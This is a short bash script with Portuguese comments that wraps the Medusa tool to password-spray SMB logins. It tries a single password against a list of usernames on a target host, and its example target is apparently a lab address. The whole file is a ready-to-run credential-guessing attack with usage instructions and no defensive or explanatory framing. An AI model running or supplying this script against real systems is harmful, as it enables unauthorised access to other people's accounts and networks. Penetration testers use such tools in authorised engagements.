#!/bin/bash
# Wrapper para password spraying em SMB com Medusa
if [ "$#" -ne 3 ]; then
  echo "Uso: $0 ALVO ARQUIVO_USUARIOS SENHA"
  echo "Exemplo: $0 192.168.56.20 ../wordlists/users.txt 'Password123'"
  exit 1
fi

ALVO="$1"
USUARIOS="$2"
SENHA="$3"

echo "[*] Executando password spraying Medusa SMB contra $ALVO"
medusa -h "$ALVO" -U "$USUARIOS" -p "$SENHA" -M smbnt -t 4 -f

echo "[*] Concluído. Revise a saída do Medusa para logins válidos."
